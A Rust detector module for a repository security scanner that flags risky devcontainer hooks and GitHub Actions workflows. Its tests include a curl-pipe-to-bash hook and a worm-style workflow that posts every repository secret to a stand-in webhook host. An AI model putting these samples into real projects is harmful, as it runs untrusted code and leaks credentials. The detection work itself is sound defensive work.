//! T9: devcontainer lifecycle commands and GitHub Actions workflows.

use crate::util::{ExecEntry, changed_entries, clip, danger, parse_jsonc, refs_in, str_of, texts};
use serde_json::Value;
use shield_core::{Detector, FileChange, FileStatus, Finding, Severity, Threat};
use yaml_rust2::{Yaml, YamlLoader};

const DEVCONTAINER_HOOKS: &[(&str, bool)] = &[
    // (key, runs on the host)
    ("initializeCommand", true),
    ("onCreateCommand", false),
    ("updateContentCommand", false),
    ("postCreateCommand", false),
    ("postStartCommand", false),
    ("postAttachCommand", false),
];

fn is_devcontainer(p: &str) -> bool {
    let name = p.rsplit('/').next().unwrap_or(p);
    name == ".devcontainer.json" || (p.contains(".devcontainer/") && name == "devcontainer.json")
}

fn is_workflow(p: &str) -> bool {
    (p.starts_with(".github/workflows/") || p.contains("/.github/workflows/"))
        && (p.ends_with(".yml") || p.ends_with(".yaml"))
}

pub struct Ci;

impl Detector for Ci {
    fn name(&self) -> &'static str {
        "ci"
    }

    fn interested(&self, c: &FileChange) -> bool {
        let p = c.path.to_ascii_lowercase();
        c.new.is_some() && (is_devcontainer(&p) || is_workflow(&p))
    }

    fn scan_file(&self, c: &FileChange, out: &mut Vec<Finding>) {
        let (Some((old, new)), Some(blob)) = (texts(c), c.new.as_ref()) else { return };
        if is_devcontainer(&c.path.to_ascii_lowercase()) {
            devcontainer(&old, &new, &blob.oid, out);
        } else {
            workflow(&old, &new, &blob.oid, c.status == FileStatus::Added, out);
        }
    }
}

// ---- devcontainer --------------------------------------------------------

fn dc_entries(v: &Value) -> Vec<ExecEntry> {
    let mut out = Vec::new();
    for (key, _) in DEVCONTAINER_HOOKS {
        match v.get(*key) {
            Some(Value::Object(m)) => {
                for (k, x) in m {
                    if let Some(cmd) = str_of(x) {
                        out.push(ExecEntry { key: format!("{key}.{k}"), command: cmd });
                    }
                }
            }
            Some(x) => {
                if let Some(cmd) = str_of(x) {
                    out.push(ExecEntry { key: (*key).to_string(), command: cmd });
                }
            }
            None => {}
        }
    }
    out
}

fn devcontainer(old: &str, new: &str, oid: &str, out: &mut Vec<Finding>) {
    let Some(n) = parse_jsonc(new) else { return };
    let o = parse_jsonc(old).unwrap_or(Value::Null);
    let (oe, ne) = (dc_entries(&o), dc_entries(&n));
    for e in changed_entries(&oe, &ne) {
        let host = DEVCONTAINER_HOOKS.iter().any(|(k, h)| *h && e.key.split('.').next() == Some(k));
        let bad = danger(&e.command);
        let sev = match (bad, host) {
            (Some(_), _) => Severity::Critical,
            (None, true) => Severity::High,
            (None, false) => Severity::Medium,
        };
        let title = if host {
            format!("devcontainer `{}` runs on your machine (host) before the container starts", e.key)
        } else {
            format!("devcontainer `{}` runs when the container is created/started", e.key)
        };
        let mut f = Finding::new(Threat::T9, "t9.devcontainer.command", sev, title)
            .anchor(format!("{oid}:{}", e.key))
            .refs(refs_in(&e.command))
            .detail(format!("command: {}", clip(&e.command, 200)));
        if let Some(b) = bad {
            f = f.detail(b);
        }
        out.push(f);
    }
    let features = |v: &Value| -> Vec<String> {
        v.get("features").and_then(Value::as_object).map(|m| m.keys().cloned().collect()).unwrap_or_default()
    };
    let old_f = features(&o);
    for feat in features(&n).into_iter().filter(|f| !old_f.contains(f)) {
        if feat.starts_with("ghcr.io/devcontainers/") || feat.starts_with("ghcr.io/devcontainers-contrib/") {
            continue;
        }
        out.push(
            Finding::new(
                Threat::T9,
                "t9.devcontainer.feature",
                Severity::Low,
                "devcontainer adds a third-party feature",
            )
            .anchor(format!("{oid}:feature:{feat}"))
            .detail(format!("feature: {feat} (its install script runs as root in the container)")),
        );
    }
}

// ---- workflows -----------------------------------------------------------

/// One suspicious thing in a workflow, keyed so unchanged ones are not re-reported.
#[derive(Debug, Clone, PartialEq)]
struct Signal {
    rule: &'static str,
    severity: Severity,
    key: String,
    title: String,
    detail: String,
}

fn yaml_str(y: &Yaml) -> Option<String> {
    match y {
        Yaml::String(s) => Some(s.clone()),
        Yaml::Integer(i) => Some(i.to_string()),
        Yaml::Boolean(b) => Some(b.to_string()),
        Yaml::Array(a) => Some(a.iter().filter_map(yaml_str).collect::<Vec<_>>().join(" ")),
        _ => None,
    }
}

/// Trigger names from `on:` (string, list or map).
fn triggers(doc: &Yaml) -> Vec<String> {
    let on = &doc["on"];
    let on = if on.is_badvalue() { &doc[true_key()] } else { on };
    match on {
        Yaml::String(s) => vec![s.clone()],
        Yaml::Array(a) => a.iter().filter_map(yaml_str).collect(),
        Yaml::Hash(h) => h.keys().filter_map(yaml_str).collect(),
        _ => Vec::new(),
    }
}

/// YAML 1.1 parsers read a bare `on:` as boolean true; accept both.
fn true_key() -> &'static str {
    "true"
}

static INJECTION: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(r"\$\{\{\s*(github\.event\.(issue|pull_request|comment|review|review_comment|head_commit|commits|discussion|pages)[\w.\[\]*]*\.(title|body|message|label|name|ref|email|page_name|default_branch)|github\.head_ref)\s*\}\}").unwrap()
});

fn signals(text: &str) -> Vec<Signal> {
    let Ok(docs) = YamlLoader::load_from_str(text) else { return Vec::new() };
    let Some(doc) = docs.first() else { return Vec::new() };
    let on = triggers(doc);
    let prt = on.iter().any(|t| t == "pull_request_target" || t == "workflow_run");
    let untrusted_trigger =
        on.iter().any(|t| matches!(t.as_str(), "discussion" | "discussion_comment" | "issue_comment" | "issues"));
    let mut out = Vec::new();
    // `toJSON(secrets)` anywhere (run, env, with) hands every secret to the job.
    for line in text.lines() {
        let squashed: String = line.chars().filter(|c| !c.is_whitespace()).collect::<String>().to_ascii_lowercase();
        if squashed.contains("tojson(secrets)") {
            out.push(Signal {
                rule: "t9.workflow.secrets-dump",
                severity: Severity::Critical,
                key: "dump".into(),
                title: "Workflow serialises every repository secret".into(),
                detail: format!("line: {}", clip(line.trim(), 200)),
            });
        }
    }
    let Yaml::Hash(jobs) = &doc["jobs"] else { return out };
    for (jid, job) in jobs {
        let jid = yaml_str(jid).unwrap_or_default();
        let runs_on = yaml_str(&job["runs-on"]).unwrap_or_default();
        if runs_on.contains("self-hosted") && untrusted_trigger {
            out.push(Signal {
                rule: "t9.workflow.self-hosted-backdoor",
                severity: Severity::High,
                key: format!("{jid}:self-hosted"),
                title: format!("Job `{jid}` runs on a self-hosted runner from issue/discussion events"),
                detail: format!("triggers: {}; anyone who can comment can run code on that machine", on.join(", ")),
            });
        }
        let Yaml::Array(steps) = &job["steps"] else { continue };
        for (i, step) in steps.iter().enumerate() {
            let uses = yaml_str(&step["uses"]).unwrap_or_default();
            if prt && uses.starts_with("actions/checkout") {
                let r = yaml_str(&step["with"]["ref"]).unwrap_or_default();
                if r.contains("pull_request.head")
                    || r.contains("head_ref")
                    || r.contains("github.event.workflow_run.head")
                {
                    out.push(Signal {
                        rule: "t9.workflow.prt-checkout",
                        severity: Severity::High,
                        key: format!("{jid}:{i}:prt"),
                        title: format!("Job `{jid}` checks out untrusted PR code with write permissions"),
                        detail: format!("pull_request_target + checkout ref {r}; secrets are available to that code"),
                    });
                }
            }
            let Some(run) = yaml_str(&step["run"]) else { continue };
            let lower = run.to_ascii_lowercase();
            if lower.contains("secrets.") && lower.contains("base64") {
                out.push(Signal {
                    rule: "t9.workflow.secrets-dump",
                    severity: Severity::High,
                    key: format!("{jid}:{i}:encode"),
                    title: format!("Job `{jid}` encodes secrets"),
                    detail: format!("run: {}", clip(&run, 200)),
                });
            }
            if let Some(b) = danger(&run) {
                out.push(Signal {
                    rule: "t9.workflow.remote-exec",
                    severity: Severity::Medium,
                    key: format!("{jid}:{i}:{}", clip(&run, 80)),
                    title: format!("Job `{jid}` step {i} fetches or decodes code to run"),
                    detail: format!("{b}: {}", clip(&run, 200)),
                });
            }
            if let Some(m) = INJECTION.find(&run) {
                out.push(Signal {
                    rule: "t9.workflow.injection",
                    severity: Severity::Medium,
                    key: format!("{jid}:{i}:{}", m.as_str()),
                    title: format!("Job `{jid}` interpolates untrusted event text into a shell"),
                    detail: format!("{} inside run: — use an env var instead", m.as_str()),
                });
            }
        }
    }
    out
}

fn workflow(old: &str, new: &str, oid: &str, is_new_file: bool, out: &mut Vec<Finding>) {
    let before = signals(old);
    for s in signals(new) {
        if before.iter().any(|b| b.rule == s.rule && b.detail == s.detail) {
            continue;
        }
        out.push(
            Finding::new(Threat::T9, s.rule, s.severity, s.title).anchor(format!("{oid}:{}", s.key)).detail(s.detail),
        );
    }
    if is_new_file {
        out.push(
            Finding::new(Threat::T9, "t9.workflow.added", Severity::Low, "New CI workflow")
                .anchor(format!("{oid}:added"))
                .detail("Check its triggers and what it does with secrets."),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil::{added, modified, scan};

    fn rules(f: &[Finding]) -> Vec<(&str, Severity)> {
        f.iter().map(|x| (x.rule, x.severity)).collect()
    }

    #[test]
    fn devcontainer_commands() {
        let d = r#"{ // jsonc
          "initializeCommand": "./scripts/prep.sh",
          "postCreateCommand": { "deps": "npm ci", "x": "curl -s https://x.example | bash" },
          "features": { "ghcr.io/devcontainers/features/node:1": {}, "ghcr.io/evil/feat:1": {} }
        }"#;
        let f = scan(&Ci, &added(".devcontainer/devcontainer.json", d.as_bytes()));
        let r = rules(&f);
        assert!(r.contains(&("t9.devcontainer.command", Severity::High)), "{r:?}");
        assert!(r.contains(&("t9.devcontainer.command", Severity::Medium)));
        assert!(r.contains(&("t9.devcontainer.command", Severity::Critical)));
        assert!(r.contains(&("t9.devcontainer.feature", Severity::Low)));
        assert!(scan(&Ci, &modified(".devcontainer.json", d.as_bytes(), d.as_bytes())).is_empty());
    }

    const SHAI: &str = "name: Shai-Hulud Workflow\non: push\njobs:\n  data-collection:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d \"$CONTENTS\" https://webhook.example/x; echo $CONTENTS | base64 -w 0 | base64 -w 0\n        env:\n          CONTENTS: ${{ toJSON(secrets) }}\n";

    #[test]
    fn workflows() {
        let f = scan(&Ci, &added(".github/workflows/shai-hulud-workflow.yml", SHAI.as_bytes()));
        assert!(rules(&f).contains(&("t9.workflow.secrets-dump", Severity::Critical)), "{f:#?}");
        let dump = "on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo '${{ toJSON(secrets) }}' > s.json\n";
        let f = scan(&Ci, &added(".github/workflows/ci.yml", dump.as_bytes()));
        assert!(rules(&f).contains(&("t9.workflow.secrets-dump", Severity::Critical)), "{f:#?}");
        assert!(rules(&f).contains(&("t9.workflow.added", Severity::Low)));

        let prt = "on:\n  pull_request_target:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm test\n";
        assert!(
            rules(&scan(&Ci, &added(".github/workflows/t.yml", prt.as_bytes())))
                .contains(&("t9.workflow.prt-checkout", Severity::High))
        );

        let inj = "on: issues\njobs:\n  t:\n    runs-on: self-hosted\n    steps:\n      - run: echo \"${{ github.event.issue.title }}\"\n";
        let found = scan(&Ci, &added(".github/workflows/t.yml", inj.as_bytes()));
        let r = rules(&found);
        assert!(r.contains(&("t9.workflow.injection", Severity::Medium)), "{r:?}");
        assert!(r.contains(&("t9.workflow.self-hosted-backdoor", Severity::High)));

        let ok = "on: [push, pull_request]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: cargo test\n";
        assert!(
            scan(
                &Ci,
                &modified(".github/workflows/ci.yml", ok.as_bytes(), ok.replace("test", "test --all").as_bytes())
            )
            .is_empty()
        );
    }
}
